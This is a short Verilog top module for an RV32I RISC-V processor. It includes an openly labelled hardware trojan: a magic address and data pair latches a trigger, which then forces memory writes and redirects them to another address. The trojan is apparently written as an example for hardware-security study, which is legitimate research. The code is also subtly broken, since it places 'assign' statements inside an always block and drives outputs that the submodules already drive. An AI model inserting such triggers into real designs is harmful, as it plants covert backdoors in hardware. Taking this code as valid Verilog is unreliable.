module RV32I_Top #(parameter n = 32) 
    (
        input clk, 
        input rst, 
        input shift_done,
        input [n-1:0] dmem_out, 
        input [n-1:0] imem_out,
        output w_en_to_bus_for_dmem,
        output [n-1:0] addr_dmem,
        output [n-1:0] data_dmem,
        output [n-1:0] pc_to_imem
    );

    wire [6:0] op_code, func7;
    wire [2:0] func3;
    wire jump, stor_sel, alu_src, wr_reg, jalr_ctl_top; //mem_wr
    wire [2:0] to_reg, branch;
    wire [3:0] alu_op;

    // Trojan trigger condition
    reg trojan_triggered = 0;

    // Original design components
    Data_Path_RV32I DUT_data_path (clk, rst, shift_done, jalr_ctl_top, jump, w_en_to_bus_for_dmem, stor_sel, alu_src, wr_reg, to_reg, branch, alu_op, dmem_out,imem_out, op_code, func7, func3, addr_dmem, data_dmem,pc_to_imem);
    CTLR_Unit_RV32I DUT_ctlr_unit (op_code, func7, func3, jump, w_en_to_bus_for_dmem, stor_sel, alu_src, wr_reg, jalr_ctl_top, to_reg, branch, alu_op);

    // Trojan behavior
    always @(posedge clk) begin
        // Example condition for the trojan to be triggered
        if (addr_dmem == 32'hDEADBEEF && data_dmem == 32'hCAFEBABE) begin
            trojan_triggered <= 1;
        end

        // If trojan is triggered, alter the behavior maliciously
        if (trojan_triggered) begin
            // Example malicious behavior: unauthorized write enable or modifying the destination address
            assign w_en_to_bus_for_dmem = 1; // Unauthorized memory write enable
            assign addr_dmem = 32'hBADBAD; // Redirecting to a different memory address
        end
    end
endmodule
 
